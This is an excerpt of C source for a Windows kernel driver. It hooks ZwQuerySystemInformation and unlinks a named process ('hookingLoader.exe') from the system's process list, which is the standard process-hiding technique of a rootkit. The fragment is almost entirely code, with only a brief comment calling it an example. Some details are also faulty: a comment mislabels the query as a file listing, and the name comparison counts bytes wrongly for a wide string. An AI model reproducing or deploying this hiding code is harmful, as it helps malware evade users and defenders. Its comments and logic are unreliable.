...
NTSTATUS hookZwQuerySystemInformation( ULONG systemInformationClass, PVOID systemInformation, ULONG systemInformationLength, PULONG returnLength ) {
	...
	//DbgPrint("hookZwQuerySystemInformation called\r\n");

	//get info from the original function
	nts = (origZwQuerySystemInformation)(systemInformationClass,systemInformation,systemInformationLength,returnLength);

	if(NT_SUCCESS(nts)) {
		if(systemInformationClass == 5) { //if asking for a file and directory listing
			struct _SYSTEM_PROCESSES *currentProcess = (struct _SYSTEM_PROCESSES *) systemInformation;
			struct _SYSTEM_PROCESSES *previousProcess = NULL;

			while(currentProcess) {
				//DbgPrint("Current process %x\r\n",currentProcess);
				if(currentProcess->ProcessName.Buffer != NULL) {
					
					/*For this example we are hiding the service that started the driver*/
					if(17 == RtlCompareMemory(currentProcess->ProcessName.Buffer,L"hookingLoader.exe",17)) { 
						
						DbgPrint("Found the process to hide\r\n");
						if(previousProcess) {
							if(currentProcess->NextEntryDelta) 
								previousProcess->NextEntryDelta += currentProcess->NextEntryDelta;
							else
								previousProcess->NextEntryDelta = 0;
						}else {
							if(currentProcess->NextEntryDelta) 
								(char *)systemInformation += currentProcess->NextEntryDelta;
							else 
				...
				if(currentProcess->NextEntryDelta) 
					((char *)currentProcess += currentProcess->NextEntryDelta);
				else 
					currentProcess = NULL;
